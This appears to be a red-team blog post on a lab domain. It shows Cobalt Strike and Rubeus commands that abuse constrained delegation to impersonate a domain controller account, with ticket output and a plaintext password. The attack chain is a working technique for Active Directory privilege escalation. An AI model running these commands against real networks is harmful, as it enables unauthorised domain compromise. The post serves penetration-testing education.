---
title: AllowedToDelegate
date: 2024-11-27 19:37:00 +/-TTTT
categories: [beacon, bypass-AV/EDR]
tags: [AllowedToDelegate, Rubeus]     # TAG names should always be lowercase
---

![img-description](/assets/images/IMG_0042.png)

In modern red teaming and penetration testing, understanding the intricacies of Active Directory (AD) permissions is essential for successful lateral movement and privilege escalation. One powerful feature that can be exploited in an AD environment is the "AllowedToDelegateTo" attribute. This attribute plays a critical role in defining which services a user or computer account is allowed to delegate user credentials to, and it can be a potential attack vector if misconfigured.

In this post, we'll explore how to leverage Cobalt Strike in conjunction with the "AllowedToDelegateTo" attribute to gain access to sensitive systems and escalate privileges. By understanding and exploiting these delegation settings, we can enhance our penetration testing strategies and identify misconfigurations that could lead to critical security vulnerabilities.

![img-description](/assets/images/WhatsApp Image 2024-11-28 at 06.22.01.jpeg)

    [11/27 22:14:00] beacon> execute-assembly /home/elliot/tools/Rubeus.exe asktgt /user:blake /password:Password123! /domain:painters.htb /outfile:ticket.kirbi

![img-description](/assets/images/WhatsApp Image 2024-11-28 at 06.25.09.jpeg)

    [11/27 22:27:07] beacon> execute-assembly /home/elliot/tools/Rubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.painters.htb /impersonateuser:DC$ /domain:painters.htb /altservice:CIFS,HOST,LDAP /ptt

its need to be say 

    [+] Ticket successfully imported!

now we can abuse next host. (btw dont reccomend powershell <command> but there is no way to check it then do less ASAP)

    [10/10 10:19:20] beacon> powershell klist
    [10/10 10:19:20] [*] Tasked beacon to run: klist
    [10/10 10:19:27] [+] host called home, sent: 79 bytes
    [10/10 10:19:28] [+] received output:

    Current LogonId is 0:0x3ce665

    Cached Tickets: (3)

    #0>	Client: DC$ @ PAINTERS.HTB
        Server: LDAP/dc.painters.htb @ PAINTERS.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 10/10/2024 15:18:55 (local)
        End Time:   10/11/2024 1:16:49 (local)
        Renew Time: 10/17/2024 15:16:49 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: 

    #1>	Client: DC$ @ PAINTERS.HTB
        Server: HOST/dc.painters.htb @ PAINTERS.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 10/10/2024 15:18:55 (local)
        End Time:   10/11/2024 1:16:49 (local)
        Renew Time: 10/17/2024 15:16:49 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: 

    #2>	Client: DC$ @ PAINTERS.HTB
        Server: CIFS/dc.painters.htb @ PAINTERS.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 10/10/2024 15:18:55 (local)
        End Time:   10/11/2024 1:16:49 (local)
        Renew Time: 10/17/2024 15:16:49 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: